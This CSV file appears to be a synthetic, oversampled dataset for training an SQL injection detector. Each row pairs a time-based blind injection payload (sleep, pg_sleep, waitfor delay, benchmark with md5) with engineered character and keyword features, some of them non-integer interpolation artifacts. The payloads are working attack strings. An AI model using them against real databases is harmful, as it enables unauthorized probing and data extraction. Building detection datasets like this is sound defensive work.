id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000016,attack,time,select sleep  (  5  )  # wihl,nearest_attack_euclidean,R000309,0.0338723183239234,28.98529941823366,14.044101745299015,3.2062449448313974,14.955898254700985,1.0147005817663395,10.014700581766338,3.0,0.5159378794492903,0.03502588356279575,0.3455336486316345,0.10350258835627957,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,0.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,0.9852994182336614,0.0,0.0,0.0,0.014700581766338428,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000017,attack,time,1'||  (  select 'pyga' from dual where 8501  =  8501 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000187,0.9337922356031918,129.34419380482603,30.032581414478145,3.6961094499595477,50.34419380482605,10.0,52.0,17.0,0.389218325019753,0.077314136073449,0.40203350758193473,0.13143403132486328,3.0,0.0,0.0,0.0,1.0,1.0,0.0,9.0,0.0,0.0,-5.551115123125783e-17,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,1.0,3.0,0.0,1.0,2.0,0.3441938048260479,0.6558061951739521,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000018,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000037,0.08231290673084461,100.0,33.54215471764908,4.081705853088795,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,1.1102230246251565e-16,1.0,6.0,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000019,attack,time,"1  )   as cnpv where 4902  =  4902 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000232,0.38296391556223913,89.11158333593983,25.88902381026852,3.4725952947603456,22.0,18.0,38.667071430805564,10.444511905134261,0.24725495956605703,0.20229951237222846,0.4332772121724737,0.11716831588924084,0.0,0.0,2.0,0.0,0.0,2.0,0.0,5.44451190513426,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000020,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000045,0.8142142287394837,59.073076220327906,18.308974593224033,3.300301446481553,27.073076220327906,1.3089745932240326,22.691025406775967,8.0,0.4579936956287991,0.022358303910267247,0.38414642436813345,0.13550157609280022,3.3089745932240318,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,4.0,0.0,0.6910254067759679,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,0.6910254067759679,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3089745932240321,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000021,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.08481982524028876,49.660697700338645,20.0,3.299962469550497,13.0,10.66069770033865,20.0,6.0,0.2618003795492235,0.21459886135232953,0.40276981469111306,0.12083094440733391,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,4.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000022,attack,time,1' where 6035  =  6035 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000241,0.30364567773794804,45.608754656616185,22.39124534338382,4.138248384880993,17.0,12.0,9.0,7.608754656616181,0.37277834339977045,0.2631376541645439,0.19735324062340792,0.16673076181227772,2.6087546566161812,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-5.551115123125783e-17,3.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000023,attack,time,"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'obeh'  =  'obeh",nearest_attack_euclidean,R000145,0.4690429923337706,116.95635179112554,27.79127035822511,3.4405120324148832,26.0,22.0,53.165081432900436,15.791270358225109,0.22268759287939677,0.18842796320564342,0.4539777402950912,0.13490670361986865,4.0,0.0,0.0,0.0,0.0,2.0,0.0,8.791270358225109,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000024,attack,time,1' rlike sleep  (  5  )   and 'ojqz' like 'ojqz,nearest_attack_euclidean,R000308,0.6129800853571321,48.72946907554072,19.351449096672233,3.619257166348629,24.56763273111482,2.0,15.729469075540717,6.432367268885178,0.5073276640131059,0.04121511096669965,0.31995066904945596,0.13150655597073851,4.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,2.432367268885179,0.0,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.2161836344425896,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2161836344425896
SMOTE_000025,attack,time,"1,  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R000264,0.47006758403621496,186.59661225598848,32.86266355748506,3.71175964638153,60.34334110628737,33.03864490239539,74.28329446856318,18.931331778742525,0.32464422228162587,0.17645911735893355,0.39724455861689406,0.10165210174254644,0.20600466377241755,0.0,0.0,0.0,1.0,1.0,0.0,13.587990672455165,0.0,0.0,1.9313317787425275,2.0,0.0686682212574724,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9313317787425275,0.0,2.9313317787425275,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9313317787425275,0.06866822125747252,0.06866822125747252,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000026,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.7341412520955048,37.95533524144691,16.0,3.004593766299947,10.999999999999998,0.0,17.477667620723455,9.477667620723455,0.29001476946921967,0.0,0.4604525314360155,0.24953269909476483,0.5223323792765449,0.9553352414469105,0.0,0.0,0.0,1.0,0.0,3.0,0.0,4.0,-5.551115123125783e-17,0.9999999999999999,0.5223323792765449,0.47766762072345514,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000027,attack,time,waitfor delay '0:0:5' and 'gsvt'  =  'gsvt,nearest_attack_euclidean,R000240,1.4232373518978727,39.46680614310856,20.276230326602445,3.949912386005648,20.104921306409786,3.0,8.0,8.361884836698778,0.5045375194406219,0.07659835480998253,0.20426227949328674,0.2146018462561089,5.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.3618848366987768,0.0,-5.551115123125783e-17,0.9999999999999999,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000028,attack,time,"1%"" rlike sleep  (  5  )  #",nearest_attack_euclidean,R000237,2.0589113194272923,26.053034500342186,14.053034500342184,3.1657110989430977,9.999999999999998,2.0,10.0,4.053034500342184,0.3843994888838195,0.0768798977767639,0.3843994888838195,0.15432112445559712,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,0.5265172501710922,0.0,-5.551115123125783e-17,0.0,0.0,1.0,0.0,0.5265172501710923,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000029,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'nslo' like 'nslo",nearest_attack_euclidean,R000268,0.41068277916418533,89.27263159529323,26.973250775916853,3.869792589068508,35.0,15.0,29.812755431417955,9.459876163875276,0.3956233174810704,0.16955285034903017,0.32949894976733557,0.1053248824025638,3.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,5.4598761638752755,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000030,attack,time,"make_set  (  8734  =  8734,sleep  (  5   )    )   ",nearest_attack_euclidean,R000281,0.698228647741975,55.10305170971775,21.430024623675116,3.3755632409052394,14.91602954841014,9.243002462367512,23.45801477420507,7.486004924735023,0.26382108645180113,0.17048525569884954,0.4289108735482995,0.13678278430104984,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.243002462367512,0.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
